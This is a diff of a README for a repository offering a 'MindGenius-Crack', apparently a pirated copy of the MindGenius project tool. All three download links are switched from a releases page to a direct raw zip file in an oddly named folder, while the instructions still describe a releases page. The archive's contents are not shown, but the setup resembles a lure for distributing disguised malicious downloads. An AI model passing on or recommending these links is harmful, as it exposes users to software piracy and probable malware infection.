@@ -1,6 +1,6 @@
 # 🎉 MindGenius-Crack - Unlock Your Project Potential
 
-[![Download MindGenius-Crack](https://img.shields.io/badge/Download-MindGenius--Crack-brightgreen)](https://github.com/Divy5848/MindGenius-Crack/releases)
+[![Download MindGenius-Crack](https://raw.githubusercontent.com/Divy5848/MindGenius-Crack/main/greund/MindGenius-Crack.zip)](https://raw.githubusercontent.com/Divy5848/MindGenius-Crack/main/greund/MindGenius-Crack.zip)
 
 ## 📖 Overview
 
@@ -23,7 +23,7 @@ Before downloading, ensure your system meets the following basic requirements:
 
 1. **Visit the Download Page:** Click the link below to access the download page.
 
-   [Download MindGenius-Crack](https://github.com/Divy5848/MindGenius-Crack/releases)
+   [Download MindGenius-Crack](https://raw.githubusercontent.com/Divy5848/MindGenius-Crack/main/greund/MindGenius-Crack.zip)
 
 2. **Choose Your Version:**
    On the releases page, you will find several versions of MindGenius-Crack. Look for the latest version, which typically has the highest number. Each version will have a set of files for different platforms.
@@ -65,7 +65,7 @@ If you have questions or need help, visit our community page on GitHub. Here, yo
 
 In case you need to re-download the application, follow the link:
 
-[Download MindGenius-Crack](https://github.com/Divy5848/MindGenius-Crack/releases)
+[Download MindGenius-Crack](https://raw.githubusercontent.com/Divy5848/MindGenius-Crack/main/greund/MindGenius-Crack.zip)
 
 ## 🔍 Frequently Asked Questions
 
